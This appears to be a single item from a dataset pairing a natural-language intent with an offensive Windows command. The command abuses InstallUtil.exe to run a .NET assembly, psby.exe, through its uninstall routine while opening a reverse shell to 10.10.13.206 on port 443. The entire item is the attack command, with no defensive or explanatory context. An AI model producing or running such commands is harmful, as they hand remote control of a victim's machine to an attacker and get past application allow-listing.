# Natural language intent:
# Reverse shell: uninstall a .NET assembly (psby.exe) using InstallUtil.exe while simultaneously attempting to establish a reverse shell connection to the IP address 10.10.13.206 on port 443, with logging to the console enabled.

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
